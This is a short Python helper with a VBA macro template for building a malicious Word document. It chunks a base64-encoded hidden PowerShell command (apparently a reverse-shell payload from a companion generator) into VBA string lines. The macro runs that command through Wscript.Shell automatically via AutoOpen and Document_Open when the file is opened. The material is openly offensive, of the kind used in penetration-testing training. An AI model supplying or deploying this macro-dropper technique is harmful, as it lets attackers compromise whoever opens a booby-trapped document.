'''
VBA has a 255-character limit for literal strings and therefore, we can't 
just embed the base64-encoded PowerShell commands as a single string. 
This restriction does not apply to strings stored in variables, so we 
can split the commands into multiple lines (stored in strings) and 
concatenate them.
'''

# For cmd.exe execution
# str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

# For powershell.exe execution, use generate_pwsh_reverse.py
str = ""

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"\n')

# Paste the code into the macros below
# Save the macro as *.doc 97-03, or *.docm

```
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String
	// Formatted payload
	CreateObject("Wscript.Shell").Run Str
End Sub
```